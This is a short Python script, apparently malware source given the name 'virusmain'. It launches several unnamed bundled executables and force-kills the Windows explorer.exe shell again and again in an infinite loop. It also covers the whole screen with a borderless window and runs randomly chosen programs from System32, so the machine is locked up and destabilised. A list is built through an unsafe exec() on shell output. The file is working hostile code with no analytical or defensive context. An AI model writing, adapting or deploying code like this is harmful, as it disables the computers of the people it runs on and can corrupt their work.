from tkinter import *
import tkinter as t
import subprocess
import os
import random
import playsound as p

locall = None
value = 0

subprocess.Popen(".\\disable.exe")
subprocess.Popen(".\\x.exe")
subprocess.Popen(".\\start.exe")

class decoder():
 def decode2(self,par):
     y = str(par.communicate()[0].decode()).replace("\n","").replace("\r",'''","''')
     return y

 def decode4(self):
     return self.locall

 def decode3(self,parr):
     global locall
     z = self.decode2(parr)
     exec(f'''self.locall = [{('"' + z)[:-1]}]''')
     return self.decode4()

 def execfilehigh(self):
     x = subprocess.Popen("dir %windir%\\System32\\*.exe /b",stdout=subprocess.PIPE,shell=True)
     return x

def m():
    n()

def n():
    p.playsound()

subprocess.Popen("taskkill /im explorer.exe /f",shell=True)

virusmain = Tk()
root = virusmain
root.overrideredirect(True)
root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
while True:
    subprocess.Popen("taskkill /im explorer.exe /f",shell=True)
    if random.choice((True,False,False,False,False)):
        subprocess.Popen(".\\main.exe")
    r = decoder()
    p = r.decode3(r.execfilehigh())
    subprocess.Popen(f"%windir%\\System32\\{p[random.randrange(0,(len(p) - 1))]}",shell=True,stdout=subprocess.PIPE)
    subprocess.Popen(".\\desktop.exe")
    
    virusmain.update()
    virusmain.update_idletasks()